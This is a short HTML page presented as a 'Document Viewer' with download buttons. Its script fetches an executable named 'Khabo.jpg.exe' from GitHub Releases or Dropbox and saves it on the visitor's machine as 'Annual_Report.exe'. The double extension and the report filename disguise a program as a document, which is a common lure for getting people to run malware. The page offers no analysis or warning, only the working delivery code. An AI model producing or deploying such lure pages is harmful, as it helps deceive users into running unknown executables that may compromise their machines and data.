<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <style>
        /* Your existing styles */
    </style>
</head>
<body>
    <div class="download-section">
        <button onclick="downloadFromReleases()">Download (GitHub Releases)</button>
        <button onclick="downloadFromDropbox()">Download (Dropbox)</button>
    </div>

    <script>
        // Method 1: Using GitHub Releases
        async function downloadFromReleases() {
            const url = 'https://github.com/mitasahi/root/releases/download/latest/Khabo.jpg.exe';
            startDownload(url, 'Annual_Report.exe');
        }

        // Method 2: Using Dropbox
        async function downloadFromDropbox() {
            const url = 'https://www.dropbox.com/s/yourfileid/Khabo.jpg.exe?dl=1';
            startDownload(url, 'Annual_Report.exe');
        }

        // Universal download function
        async function startDownload(url, filename) {
            try {
                const res = await fetch(url);
                if (!res.ok) throw new Error(`Server responded with ${res.status}`);
                
                const blob = await res.blob();
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(a.href);
                }, 100);
                alert('Download started!');
            } catch (e) {
                alert('Failed to download: ' + e.message);
            }
        }
    </script>
</body>
</html>
